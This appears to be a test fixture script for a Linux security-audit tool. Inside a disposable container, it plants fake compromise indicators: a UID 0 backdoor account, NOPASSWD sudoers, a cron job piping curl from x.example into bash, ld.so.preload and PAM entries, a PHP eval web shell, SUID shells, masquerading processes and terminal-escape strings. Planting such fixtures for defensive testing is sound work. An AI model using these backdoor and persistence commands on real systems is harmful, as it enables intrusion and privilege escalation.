#!/bin/sh
# Plants fake indicators of compromise inside a disposable test container.
# NEVER run this on a real host: it creates a UID 0 account and SUID shells.
set -u
umask 022
if [ ! -f /etc/ubuntu-sys-audit-e2e ]; then
	echo "refusing to run: /etc/ubuntu-sys-audit-e2e is missing, this does not look like the test container" >&2
	exit 1
fi
# Docker mounts these noexec; the fixtures below need to run from them.
mount -o remount,exec /dev/shm 2>/dev/null
mount -o remount,exec /tmp 2>/dev/null

# --- not an indicator: replace udevadm the way dpkg does during an upgrade, so
# the running udevd now shows a deleted binary. This must not read as masquerade.
udevadm=$(command -v udevadm)
cp -p "$udevadm" "$udevadm.new" && mv "$udevadm.new" "$udevadm"
# The same for a service holding a port: stale, but not malware.
cp -p /usr/sbin/nginx /usr/sbin/nginx.new && mv /usr/sbin/nginx.new /usr/sbin/nginx

# --- accounts
echo 'backdoor:x:0:0::/root:/bin/bash' >>/etc/passwd
echo 'backdoor:$6$saltsalt$AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH:20000:0:99999:7:::' >>/etc/shadow
useradd -m nopass 2>/dev/null
sed -i 's/^nopass:[^:]*:/nopass::/' /etc/shadow
usermod -s /bin/bash www-data
echo 'ghost::1500:1500::/tmp:/bin/bash' >>/etc/passwd
echo 'inlinehash:$6$saltsalt$AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH:1501:1501::/tmp:/bin/bash' >>/etc/passwd
echo 'www-data ALL=(ALL) NOPASSWD:ALL' >/etc/sudoers.d/web
chmod 440 /etc/sudoers.d/web

# --- hostile files a root scan must not trip over
useradd -m bob 2>/dev/null
rm -f /home/bob/.bashrc /home/bob/.profile
ln -s /etc/shadow /home/bob/.bashrc
mkfifo /home/bob/.profile
ln -s /dev/null /home/bob/.bash_history
mkdir -p /home/bob/.ssh
ln -s /etc/shadow /home/bob/.ssh/authorized_keys

# --- ssh
# Spelled with "=", which sshd accepts and a naive parser reads as unset.
rm -f /etc/ssh/sshd_config.d/*
{ printf 'PermitRootLogin = yes\nPasswordAuthentication = yes\n'; cat /etc/ssh/sshd_config; } >/tmp/sshd_config.new
cat /tmp/sshd_config.new >/etc/ssh/sshd_config
mkdir -p /var/www/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGZha2VrZXlmb3JlbmR0b2VuZHRlc3RmaXh0dXJlMDAwMDA= e2e-attacker@evil' >/var/www/.ssh/authorized_keys

# --- persistence
echo '* * * * * root curl -fsSL http://x.example/a.sh | bash' >/etc/cron.d/backdoor
printf '[Service]\nExecStart=/tmp/.x/run\n[Install]\nWantedBy=multi-user.target\n' >/etc/systemd/system/update-check.service
echo '/usr/lib/libfake-not-there.so' >/etc/ld.so.preload
echo 'auth optional /opt/evil/pam_evil.so' >>/etc/pam.d/su
# Hidden behind symlinks, which a scan that skips links would never see.
mkdir -p /var/tmp/p
echo 'curl -fsSL http://x.example/a | bash' >/var/tmp/p/rc
rm -f /root/.bashrc
ln -s /var/tmp/p/rc /root/.bashrc
printf '[Service]\nExecStart=/tmp/.x/run\n' >/var/tmp/p/linked.service
ln -s /var/tmp/p/linked.service /etc/systemd/system/linked.service
# Fake credentials in the forms people really use. None may reach a report.
mkdir -p /var/spool/cron/crontabs
cat >/var/spool/cron/crontabs/root <<'CRON'
0 1 1 1 * mysqldump -uroot -pS3CRET1 db
0 2 1 1 * PGPASSWORD=S3CRET2 pg_dump x
0 3 1 1 * curl -u a:S3CRET3 http://x.example/
0 4 1 1 * curl -H "Authorization: Bearer S3CRET4" http://x.example/
CRON
chmod 600 /var/spool/cron/crontabs/root
echo 'deb https://user:S3CRET5@mirror.example.com/ubuntu noble main' >/etc/apt/sources.list.d/creds.list
# Control characters a compromised host could aim at the operator's terminal.
printf '\033]0;pwn\007evil' >/proc/sys/kernel/hostname

# --- filesystem
mkdir -p /tmp/.x
cp /bin/dash /tmp/.x/sh && chmod 4755 /tmp/.x/sh
chmod u+s /usr/bin/find
if command -v setcap >/dev/null; then
	cp /bin/cat /usr/local/bin/capcat
	setcap cap_setuid+ep /usr/local/bin/capcat
fi
touch "$(printf '/tmp/evil\033[2Jname')" && chmod +x "$(printf '/tmp/evil\033[2Jname')"

# --- trojaned binary: changes content, keeps the package's path
if [ -x /usr/bin/who ]; then
	printf '\n#trojan' >>/usr/bin/who
fi
# /bin/login is at /usr/bin/login on merged systems, and really in /bin on 18.04.
printf '\n#trojan' >>/bin/login
# Replaced by a link, and removed: neither leaves a file to hash.
rm -f /usr/bin/passwd /usr/bin/chage
ln -s /tmp/.x/sh /usr/bin/passwd

# --- web
mkdir -p /var/www/html/uploads
echo '<?php @eval($_POST["x"]); ?>' >/var/www/html/uploads/shell.php
echo '<?php echo "fine"; ?>' >/var/www/html/index.php
echo 'x' >/var/www/html/logo.php.jpg
# A release linked out of the web root, as deploy tools do.
mkdir -p /data/www2
echo '<?php @eval($_POST["x"]); ?>' >/data/www2/hidden.php
ln -s /data/www2 /var/www/html/current
# A FIFO where the nginx check looks. It must not stall the scan.
mkdir -p /opt/stall/sbin
mkfifo /opt/stall/sbin/nginx
mkdir -p /usr/local/nginx/sbin
# A fake "self compiled" nginx: if the audit ever executed it, the sentinel
# file would appear and the end to end check would fail.
cat >/usr/local/nginx/sbin/nginx <<'EOF'
#!/bin/sh
touch /tmp/AUDIT-EXECUTED-A-HOST-BINARY
# nginx version: nginx/1.24.0
EOF
chmod +x /usr/local/nginx/sbin/nginx
mkdir -p /usr/local/php8/bin
cat >/usr/local/php8/bin/php <<'EOF'
#!/bin/sh
touch /tmp/AUDIT-EXECUTED-A-HOST-BINARY
# X-Powered-By: PHP/7.4.3
EOF
chmod +x /usr/local/php8/bin/php

# --- LXD: an old snap, and a privileged container. There is no real snap here,
# only the files the audit reads, since snapd does not run in this container.
mkdir -p /snap/lxd/current/meta
printf 'name: lxd\nversion: 5.21.1-aaaaaaa\n' >/snap/lxd/current/meta/snap.yaml
mkdir -p /var/snap/lxd/common/lxd/storage-pools/default/containers/priv1
printf 'container:\n  config:\n    security.privileged: "true"\n' >/var/snap/lxd/common/lxd/storage-pools/default/containers/priv1/backup.yaml

# --- processes
# A symlink made by an attacker gives argv[0] a path that resolves to the running
# binary. Unlike udevd's, this one belongs to no package and must still be caught.
# /bin/dash because 18.04 has no merged /usr, so /usr/bin/dash does not exist there.
ln -s /bin/dash /usr/sbin/auditd
bash -c 'exec -a /usr/sbin/auditd /bin/dash -c "sleep 86400; :"' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /dev/shm/.udevd
chmod +x /dev/shm/.udevd
bash -c 'exec -a "/sbin/udevd -d" /dev/shm/.udevd self-delete' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /tmp/.x/rs
/tmp/.x/rs shell-target >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /var/tmp/kw
bash -c 'exec -a "[kworker/0:7]" /var/tmp/kw idle' >/dev/null 2>&1 &
cp /opt/e2e/fakeimplant /var/tmp/backup
bash -c 'exec -a "backup --password=hunter2" /var/tmp/backup idle' >/dev/null 2>&1 &
sleep 1
echo planted
